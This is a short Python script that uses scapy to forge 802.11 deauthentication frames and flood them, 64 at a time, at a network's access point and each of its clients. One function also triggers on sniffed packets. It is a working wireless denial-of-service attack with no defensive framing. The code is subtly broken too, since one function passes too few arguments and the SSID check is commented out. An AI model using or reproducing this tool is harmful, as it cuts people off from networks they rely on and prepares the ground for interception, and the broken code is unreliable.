from scapy.all import sendp, Dot11Elt, Dot11, RadioTap, Dot11Deauth
from wifi import Wifi


def check_deauth(pkt):
    print("Recived package")
    elt = pkt[Dot11Elt]
    while elt and elt.ID != 0:
        elt = elt.payload[Dot11Elt]
    print(elt.info)
    # if elt.info == SSID:
    deauth(pkt[Dot11].addr1, pkt[Dot11].addr2)


def deauth(iface: str, BSSID: str, client: str, reason: int = 7):
    packet = RadioTap() / \
        Dot11(type=0, subtype=12, addr1=BSSID, addr2=client, addr3=client) / \
        Dot11Deauth(reason=reason)
    print(f'SENDING DEAUTH to {BSSID}')
    sendp(packet, iface=iface, count=64, inter=0.1)


def deauth_clients(iface: str, wifi: Wifi, reasoncode: int = 6):

    for client in wifi.clients:
        deauth(iface, wifi.BSSID, client, reason=reasoncode)


SSID = "b'Sams 9'"
